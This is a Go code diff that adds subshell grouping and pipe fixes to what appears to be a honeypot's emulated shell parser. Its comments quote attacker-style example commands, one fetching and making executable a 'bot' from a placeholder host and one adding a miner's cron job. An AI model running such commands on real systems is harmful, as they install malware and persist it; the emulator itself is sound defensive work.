@@ -36,8 +36,9 @@ func (s *Shell) Prompt() string {
 
 // step is one command in a line, plus how it is linked to the previous one.
 type step struct {
-	op   string   // ";" = always, "&&" = if the previous succeeded, "||" = if it failed, "|" = gets its output
-	args []string // command and arguments, quotes removed
+	op    string   // ";" = always, "&&" = if the previous succeeded, "||" = if it failed, "|" = gets its output
+	args  []string // command and arguments, quotes removed
+	group int      // the "( )" group it is in (0 = none): in "(a; b) | c", c gets a's and b's output
 }
 
 // Run executes a whole line, e.g. "cd /tmp && wget http://x/bot; chmod +x bot".
@@ -56,13 +57,16 @@ func (s *Shell) Run(line string) (string, int, bool) {
 		}
 		if (st.op == "&&" && code != 0) || (st.op == "||" && code == 0) || (st.op == "|" && skipped) {
 			skipped = true
+			if st.op == "|" {
+				piped = "" // nobody reads it now
+			}
 			continue
 		}
 		skipped = false
 
 		input := ""
 		if st.op == "|" {
-			input = piped
+			input, piped = piped, ""
 		}
 
 		out, c, exit := s.exec(st.args, input)
@@ -71,9 +75,16 @@ func (s *Shell) Run(line string) (string, int, bool) {
 			return screen.String(), code, true
 		}
 
-		// if the next command is linked with |, the output goes to it, not to the screen
-		if i+1 < len(steps) && steps[i+1].op == "|" {
-			piped = out
+		// the output goes to the command linked with | after this one (or after its whole group:
+		// in "(a; b) | c" both a's and b's), not to the screen
+		next := i + 1
+		for st.group != 0 && next < len(steps) && steps[next].group == st.group {
+			next++
+		}
+		if next < len(steps) && steps[next].op == "|" {
+			if len(piped) < maxSize {
+				piped += out
+			}
 		} else if screen.Len() < maxSize {
 			screen.WriteString(out)
 		}
@@ -87,7 +98,8 @@ func parse(line string) []step {
 	steps := []step{{op: ";"}}
 	var word strings.Builder
 	inWord := false
-	var quote byte // ' or " while inside quotes, 0 otherwise
+	var quote byte      // ' or " while inside quotes, 0 otherwise
+	group, open := 0, 0 // the current "( )" group's number and how many "(" are still open
 
 	endWord := func() {
 		if inWord {
@@ -99,7 +111,11 @@ func parse(line string) []step {
 	}
 	newStep := func(op string) {
 		endWord()
-		steps = append(steps, step{op: op})
+		st := step{op: op}
+		if open > 0 {
+			st.group = group
+		}
+		steps = append(steps, st)
 	}
 
 	for i := 0; i < len(line); i++ {
@@ -115,6 +131,17 @@ func parse(line string) []step {
 			quote = c
 			inWord = true // "" is still a word (an empty one)
 		case c == ' ' || c == '\t' || c == '\r':
+			endWord()
+		case c == '(' && !inWord:
+			// a subshell, "(crontab -l; echo JOB) | crontab -" (how miners add a cron job): its commands
+			// run here (no new shell), marked as one group. A "(" inside a word ("$(id)") is just text.
+			if open == 0 {
+				group++
+				steps[len(steps)-1].group = group // the step this "(" starts
+			}
+			open++
+		case c == ')' && open > 0:
+			open--
 			endWord()
 		case c == ';' || c == '\n':
 			newStep(";")
